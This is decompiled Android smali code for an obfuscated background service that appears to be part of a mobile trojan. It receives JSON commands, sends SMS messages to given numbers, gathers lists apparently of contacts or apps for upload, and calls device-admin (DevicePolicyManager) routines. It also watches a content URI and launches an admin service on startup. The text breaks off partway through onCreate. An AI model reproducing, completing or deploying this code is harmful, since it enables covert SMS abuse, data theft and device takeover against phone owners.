.class public Lcom/milkway/oden/k8sm502s;
.super Landroid/app/Service;

# interfaces
.implements Lcom/milkway/oden/b;


# static fields
.field private static a:J


# instance fields
.field private b:Landroid/app/admin/DevicePolicyManager;

.field private c:Landroid/content/ComponentName;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/milkway/oden/k8sm502s;->a:J

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic a()J
    .locals 2

    sget-wide v0, Lcom/milkway/oden/k8sm502s;->a:J

    return-wide v0
.end method

.method static synthetic a(J)J
    .locals 0

    sput-wide p0, Lcom/milkway/oden/k8sm502s;->a:J

    return-wide p0
.end method

.method public static a(Landroid/content/Context;Landroid/content/Intent;Ljava/lang/String;)V
    .locals 2

    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/milkway/oden/k8sm502s;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-virtual {v0, v1}, Landroid/content/Intent;->putExtras(Landroid/os/Bundle;)Landroid/content/Intent;

    :cond_0
    const-string v1, "type"

    invoke-virtual {v0, v1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public static a(Landroid/content/Context;Ljava/lang/String;)V
    .locals 3

    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/milkway/oden/k8sm502s;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "type"

    const-string v2, "jobs"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "data"

    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public static a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;I)V
    .locals 3

    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/milkway/oden/k8sm502s;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "type"

    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "phone"

    invoke-virtual {v0, v1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "message"

    invoke-virtual {v0, v1, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "id"

    invoke-static {p4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public a(I[Ljava/lang/String;)V
    .locals 6

    invoke-virtual {p0}, Lcom/milkway/oden/k8sm502s;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    new-instance v1, Lcom/milkway/oden/c;

    invoke-direct {v1}, Lcom/milkway/oden/c;-><init>()V

    invoke-virtual {v1, v0}, Lcom/milkway/oden/c;->e(Landroid/content/Context;)Z

    packed-switch p1, :pswitch_data_0

    :goto_0
    return-void

    :pswitch_0
    :try_start_0
    invoke-static {}, Lcom/milkway/oden/d;->a()J

    move-result-wide v2

    iput-wide v2, v1, Lcom/milkway/oden/c;->c:J

    iget-wide v2, v1, Lcom/milkway/oden/c;->c:J

    iget v4, v1, Lcom/milkway/oden/c;->a:I

    mul-int/lit16 v4, v4, 0x3e8

    int-to-long v4, v4

    add-long/2addr v2, v4

    iput-wide v2, v1, Lcom/milkway/oden/c;->c:J

    invoke-virtual {v1, v0}, Lcom/milkway/oden/c;->f(Landroid/content/Context;)Z

    invoke-static {v0, v1}, Lcom/milkway/oden/d;->a(Landroid/content/Context;Lcom/milkway/oden/c;)V

    iget-wide v0, v1, Lcom/milkway/oden/c;->c:J

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/milkway/oden/d;->a(Landroid/content/Context;Ljava/lang/Long;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    :pswitch_1
    invoke-static {p0}, Lcom/milkway/oden/d;->a(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v2

    invoke-static {v2}, Lcom/milkway/oden/d;->a(Ljava/util/List;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/milkway/oden/d;->a(Landroid/content/Context;Lcom/milkway/oden/c;Ljava/lang/String;)V

    goto :goto_0

    :pswitch_2
    invoke-static {p0}, Lcom/milkway/oden/d;->d(Landroid/content/Context;)Ljava/util/HashMap;

    move-result-object v2

    invoke-static {v2}, Lcom/milkway/oden/d;->a(Ljava/util/HashMap;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/milkway/oden/d;->b(Landroid/content/Context;Lcom/milkway/oden/c;Ljava/lang/String;)V

    goto :goto_0

    :pswitch_3
    const/4 v1, 0x0

    aget-object v1, p2, v1

    invoke-static {v0, v1}, Lcom/milkway/oden/d;->a(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    :pswitch_4
    invoke-static {v0, v1, p2}, Lcom/milkway/oden/d;->a(Landroid/content/Context;Lcom/milkway/oden/c;[Ljava/lang/String;)V

    goto :goto_0

    :pswitch_5
    iget-object v2, v1, Lcom/milkway/oden/c;->i:Lorg/json/JSONArray;

    invoke-virtual {v2}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/milkway/oden/d;->c(Landroid/content/Context;Lcom/milkway/oden/c;Ljava/lang/String;)V

    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    iput-object v2, v1, Lcom/milkway/oden/c;->i:Lorg/json/JSONArray;

    invoke-virtual {v1, v0}, Lcom/milkway/oden/c;->f(Landroid/content/Context;)Z

    goto :goto_0

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
    .end packed-switch
.end method

.method public a(Ljava/lang/String;)V
    .locals 7

    const/4 v0, 0x0

    :try_start_0
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    new-instance v1, Lcom/milkway/oden/c;

    invoke-direct {v1}, Lcom/milkway/oden/c;-><init>()V

    invoke-virtual {v1, p0}, Lcom/milkway/oden/c;->e(Landroid/content/Context;)Z

    :try_start_1
    sget-object v2, Lcom/milkway/oden/a;->q:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-static {}, Lcom/milkway/oden/d;->a()J

    move-result-wide v2

    iput-wide v2, v1, Lcom/milkway/oden/c;->c:J

    iget-wide v2, v1, Lcom/milkway/oden/c;->c:J

    sget-object v4, Lcom/milkway/oden/a;->q:Ljava/lang/String;

    invoke-virtual {v6, v4}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v4

    mul-int/lit16 v4, v4, 0x3e8

    int-to-long v4, v4

    add-long/2addr v2, v4

    iput-wide v2, v1, Lcom/milkway/oden/c;->c:J

    :cond_0
    sget-object v2, Lcom/milkway/oden/a;->s:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1

    sget-object v2, Lcom/milkway/oden/a;->s:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lcom/milkway/oden/c;->h:Ljava/lang/String;

    :cond_1
    sget-object v2, Lcom/milkway/oden/a;->r:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_2

    sget-object v2, Lcom/milkway/oden/a;->r:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v1, Lcom/milkway/oden/c;->g:Ljava/lang/String;

    :cond_2
    sget-object v2, Lcom/milkway/oden/a;->Q:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_3

    sget-object v2, Lcom/milkway/oden/a;->Q:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_3

    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    iput-object v2, v1, Lcom/milkway/oden/c;->j:Lorg/json/JSONArray;

    :cond_3
    sget-object v2, Lcom/milkway/oden/a;->R:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_4

    sget-object v2, Lcom/milkway/oden/a;->R:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_4

    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    iput-object v2, v1, Lcom/milkway/oden/c;->k:Lorg/json/JSONArray;

    :cond_4
    sget-object v2, Lcom/milkway/oden/a;->S:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_5

    sget-object v2, Lcom/milkway/oden/a;->S:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_5

    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    iput-object v2, v1, Lcom/milkway/oden/c;->l:Lorg/json/JSONArray;

    :cond_5
    sget-object v2, Lcom/milkway/oden/a;->N:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_6

    sget-object v2, Lcom/milkway/oden/a;->N:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v2

    iput-object v2, v1, Lcom/milkway/oden/c;->j:Lorg/json/JSONArray;

    :cond_6
    sget-object v2, Lcom/milkway/oden/a;->O:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_7

    sget-object v2, Lcom/milkway/oden/a;->O:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v2

    iput-object v2, v1, Lcom/milkway/oden/c;->k:Lorg/json/JSONArray;

    :cond_7
    sget-object v2, Lcom/milkway/oden/a;->P:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_8

    sget-object v2, Lcom/milkway/oden/a;->P:Ljava/lang/String;

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v2

    iput-object v2, v1, Lcom/milkway/oden/c;->l:Lorg/json/JSONArray;

    :cond_8
    invoke-virtual {v1, p0}, Lcom/milkway/oden/c;->f(Landroid/content/Context;)Z

    sget-object v1, Lcom/milkway/oden/a;->L:Ljava/lang/String;

    invoke-virtual {v6, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_a

    sget-object v1, Lcom/milkway/oden/a;->L:Ljava/lang/String;

    invoke-virtual {v6, v1}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v2

    move v1, v0

    :goto_0
    invoke-virtual {v2}, Lorg/json/JSONArray;->length()I

    move-result v3

    if-ge v1, v3, :cond_a

    invoke-virtual {v2, v1}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v3

    const-wide/16 v4, 0x1388

    invoke-static {v4, v5}, Landroid/os/SystemClock;->sleep(J)V

    sget-object v4, Lcom/milkway/oden/a;->K:Ljava/lang/String;

    invoke-virtual {v3, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    sget-object v5, Lcom/milkway/oden/a;->C:Ljava/lang/String;

    invoke-virtual {v3, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v4, v3}, Lcom/milkway/oden/d;->a(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_9
    :goto_1
    return-void

    :cond_a
    :try_start_2
    sget-object v1, Lcom/milkway/oden/a;->w:Ljava/lang/String;

    invoke-virtual {v6, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_b

    invoke-virtual {p0}, Lcom/milkway/oden/k8sm502s;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iget-object v2, p0, Lcom/milkway/oden/k8sm502s;->b:Landroid/app/admin/DevicePolicyManager;

    iget-object v3, p0, Lcom/milkway/oden/k8sm502s;->c:Landroid/content/ComponentName;

    invoke-static {v1, v2, v3}, Lcom/milkway/oden/d;->a(Landroid/content/Context;Landroid/app/admin/DevicePolicyManager;Landroid/content/ComponentName;)V

    :cond_b
    sget-object v1, Lcom/milkway/oden/a;->u:Ljava/lang/String;

    invoke-virtual {v6, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_c

    sget-object v1, Lcom/milkway/oden/a;->u:Ljava/lang/String;

    invoke-virtual {v6, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {p0, v1}, Lcom/milkway/oden/d;->b(Landroid/content/Context;Ljava/lang/String;)V

    :cond_c
    sget-object v1, Lcom/milkway/oden/a;->v:Ljava/lang/String;

    invoke-virtual {v6, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_d

    invoke-virtual {p0}, Lcom/milkway/oden/k8sm502s;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iget-object v2, p0, Lcom/milkway/oden/k8sm502s;->b:Landroid/app/admin/DevicePolicyManager;

    invoke-static {v1, v2}, Lcom/milkway/oden/d;->a(Landroid/content/Context;Landroid/app/admin/DevicePolicyManager;)V

    :cond_d
    sget-object v1, Lcom/milkway/oden/a;->I:Ljava/lang/String;

    invoke-virtual {v6, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_e

    sget-object v1, Lcom/milkway/oden/a;->I:Ljava/lang/String;

    invoke-virtual {v6, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {p0, v1}, Lcom/milkway/oden/d;->e(Landroid/content/Context;Ljava/lang/String;)V

    :cond_e
    sget-object v1, Lcom/milkway/oden/a;->J:Ljava/lang/String;

    invoke-virtual {v6, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_f

    sget-object v1, Lcom/milkway/oden/a;->J:Ljava/lang/String;

    invoke-virtual {v6, v1}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v1

    :goto_2
    invoke-virtual {v1}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-ge v0, v2, :cond_f

    invoke-virtual {v1, v0}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v2}, Lcom/milkway/oden/d;->d(Landroid/content/Context;Ljava/lang/String;)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_2

    :cond_f
    sget-object v0, Lcom/milkway/oden/a;->G:Ljava/lang/String;

    invoke-virtual {v6, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_10

    sget-object v0, Lcom/milkway/oden/a;->G:Ljava/lang/String;

    invoke-virtual {v6, v0}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v0

    sget-object v1, Lcom/milkway/oden/a;->F:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/milkway/oden/a;->E:Ljava/lang/String;

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Lcom/milkway/oden/a;->C:Ljava/lang/String;

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    sget-object v4, Lcom/milkway/oden/a;->D:Ljava/lang/String;

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    sget-object v5, Lcom/milkway/oden/a;->B:Ljava/lang/String;

    invoke-virtual {v0, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v4

    move-object v0, p0

    invoke-static/range {v0 .. v5}, Lcom/milkway/oden/d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;)V

    :cond_10
    sget-object v0, Lcom/milkway/oden/a;->t:Ljava/lang/String;

    invoke-virtual {v6, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_11

    sget-object v0, Lcom/milkway/oden/a;->t:Ljava/lang/String;

    invoke-virtual {v6, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/milkway/oden/d;->c(Landroid/content/Context;Ljava/lang/String;)V

    :cond_11
    sget-object v0, Lcom/milkway/oden/a;->x:Ljava/lang/String;

    invoke-virtual {v6, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_12

    sget-object v0, Lcom/milkway/oden/a;->x:Ljava/lang/String;

    invoke-virtual {v6, v0}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_12

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/milkway/oden/h;

    const/4 v2, 0x2

    const/4 v3, 0x0

    invoke-direct {v1, p0, p0, v2, v3}, Lcom/milkway/oden/h;-><init>(Lcom/milkway/oden/k8sm502s;Lcom/milkway/oden/b;I[Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_12
    sget-object v0, Lcom/milkway/oden/a;->y:Ljava/lang/String;

    invoke-virtual {v6, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_13

    sget-object v0, Lcom/milkway/oden/a;->y:Ljava/lang/String;

    invoke-virtual {v6, v0}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_13

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/milkway/oden/h;

    const/4 v2, 0x3

    const/4 v3, 0x0

    invoke-direct {v1, p0, p0, v2, v3}, Lcom/milkway/oden/h;-><init>(Lcom/milkway/oden/k8sm502s;Lcom/milkway/oden/b;I[Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_13
    sget-object v0, Lcom/milkway/oden/a;->A:Ljava/lang/String;

    invoke-virtual {v6, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_9

    sget-object v0, Lcom/milkway/oden/a;->A:Ljava/lang/String;

    invoke-virtual {v6, v0}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v0

    sget-object v1, Lcom/milkway/oden/a;->C:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/milkway/oden/h;

    const/4 v3, 0x4

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    aput-object v0, v4, v5

    invoke-direct {v2, p0, p0, v3, v4}, Lcom/milkway/oden/h;-><init>(Lcom/milkway/oden/k8sm502s;Lcom/milkway/oden/b;I[Ljava/lang/String;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_1
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 7

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    invoke-virtual {p0}, Lcom/milkway/oden/k8sm502s;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    new-instance v0, Lcom/milkway/oden/c;

    invoke-direct {v0}, Lcom/milkway/oden/c;-><init>()V

    invoke-virtual {v0, v1}, Lcom/milkway/oden/c;->e(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_3

    const v2, 0x7f070008

    invoke-virtual {v1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v0, Lcom/milkway/oden/c;->g:Ljava/lang/String;

    const v2, 0x7f070006

    invoke-virtual {v1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/milkway/oden/d;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v0, Lcom/milkway/oden/c;->h:Ljava/lang/String;

    const v2, 0x7f070009

    invoke-virtual {v1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    iput v2, v0, Lcom/milkway/oden/c;->a:I

    const v2, 0x7f070007

    invoke-virtual {v1, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    iput v2, v0, Lcom/milkway/oden/c;->b:I

    invoke-static {}, Lcom/milkway/oden/d;->a()J

    move-result-wide v2

    iput-wide v2, v0, Lcom/milkway/oden/c;->c:J

    iget-wide v2, v0, Lcom/milkway/oden/c;->c:J

    iget v4, v0, Lcom/milkway/oden/c;->b:I

    mul-int/lit16 v4, v4, 0x3e8

    int-to-long v4, v4

    add-long/2addr v2, v4

    iput-wide v2, v0, Lcom/milkway/oden/c;->c:J

    invoke-virtual {v0, v1}, Lcom/milkway/oden/c;->f(Landroid/content/Context;)Z

    :cond_0
    :goto_0
    iget-wide v2, v0, Lcom/milkway/oden/c;->c:J

    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/milkway/oden/d;->a(Landroid/content/Context;Ljava/lang/Long;)V

    sget-object v2, Lcom/milkway/oden/a;->ab:Ljava/lang/String;

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {p0}, Lcom/milkway/oden/k8sm502s;->getBaseContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const/4 v4, 0x1

    new-instance v5, Lcom/milkway/oden/g;

    new-instance v6, Landroid/os/Handler;

    invoke-direct {v6}, Landroid/os/Handler;-><init>()V

    invoke-direct {v5, p0, v6}, Lcom/milkway/oden/g;-><init>(Lcom/milkway/oden/k8sm502s;Landroid/os/Handler;)V

    invoke-virtual {v3, v2, v4, v5}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    iget-object v0, v0, Lcom/milkway/oden/c;->i:Lorg/json/JSONArray;

    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lez v0, :cond_1

    invoke-static {v1}, Lcom/milkway/oden/d;->e(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_1

    new-instance v0, Ljava/lang/Thread;

    new-instance v2, Lcom/milkway/oden/h;

    const/4 v3, 0x6

    const/4 v4, 0x0

    invoke-direct {v2, p0, p0, v3, v4}, Lcom/milkway/oden/h;-><init>(Lcom/milkway/oden/k8sm502s;Lcom/milkway/oden/b;I[Ljava/lang/String;)V

    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_1
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Lcom/milkway/oden/k8sm502s;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    iput-object v0, p0, Lcom/milkway/oden/k8sm502s;->b:Landroid/app/admin/DevicePolicyManager;

    new-instance v0, Landroid/content/ComponentName;

    const-class v2, Lcom/milkway/oden/admin/d92kh62k;

    invoke-direct {v0, v1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v0, p0, Lcom/milkway/oden/k8sm502s;->c:Landroid/content/ComponentName;

    invoke-static {v1}, Lcom/milkway/oden/c;->c(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_2

    invoke-static {v1}, Lcom/milkway/oden/c;->d(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/milkway/oden/admin/d80ckq;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcom/milkway/oden/k8sm502s;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_2
    return-void

    :cond_3
    invoke-static {}, Lcom/milkway/oden/d;->a()J

    move-result-wide v2

